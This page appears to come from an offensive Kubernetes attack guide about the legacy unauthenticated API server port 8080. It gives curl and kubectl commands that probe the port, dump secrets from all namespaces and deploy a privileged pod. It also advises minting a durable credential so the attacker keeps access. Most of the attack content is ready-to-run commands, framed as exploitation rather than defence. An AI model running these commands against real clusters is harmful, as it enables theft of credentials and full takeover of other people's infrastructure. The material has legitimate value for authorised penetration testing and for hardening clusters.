---
title: "Insecure apiserver port: the legacy unauthenticated control plane"
order: 5
description: "Older Kubernetes API servers could serve an insecure port, historically 8080, that performed no authentication or authorization: every request arrived as a trusted call. Where such a port is still enabled or exposed, an attacker reaching it has full, unauthenticated control of the cluster, reading secrets and creating workloads at will."
keywords:
  - insecure port
  - 8080
  - api server
  - unauthenticated
  - localhost
---

# Insecure apiserver port

Legacy Kubernetes API servers offered an insecure serving port, by default 8080, bound to localhost, that applied no authentication and no authorization: anything that connected was treated as fully authorized. It was intended only for bootstrap and local admin, but clusters that enabled it on a reachable interface, or exposed it through a misconfigured proxy or a hostNetwork pod, hand complete control to anyone who reaches it. Modern versions removed the flag, but older and bespoke clusters still run it.

Probe for it:

```bash
# plain HTTP, no credentials; a JSON version response means full access
curl -s http://<api>:8080/version
curl -s http://<api>:8080/api/v1/namespaces/kube-system/secrets | head
# from a hostNetwork pod, the localhost binding is reachable
curl -s http://127.0.0.1:8080/api/v1/nodes
```

## Full control with no credential

```bash
# point kubectl at the insecure port
kubectl --server=http://<api>:8080 get secrets --all-namespaces
kubectl --server=http://<api>:8080 get nodes
# create a node-owning pod directly
kubectl --server=http://<api>:8080 apply -f privileged-pod.yaml
```

## Exploitation notes

- The insecure port is authorization-free: there is no `can-i` to check, every verb on every resource succeeds, so it is immediate cluster compromise when reachable.
- It is usually bound to localhost, so the realistic reach is from the control-plane node itself or a `hostNetwork` pod scheduled there; see [Host namespaces](../pod-escape-to-node/host-namespaces.md).
- Where present, prefer reading secrets and minting a durable credential ([CSR approval](../rbac-privilege-escalation/csr-approval.md)) over relying on the port, which may be closed in a patch.

## References

- [Kubernetes: API server ports and bootstrapping](https://kubernetes.io/docs/concepts/security/controlling-access/)
- [kube-hunter: insecure API server](https://aquasecurity.github.io/kube-hunter/)
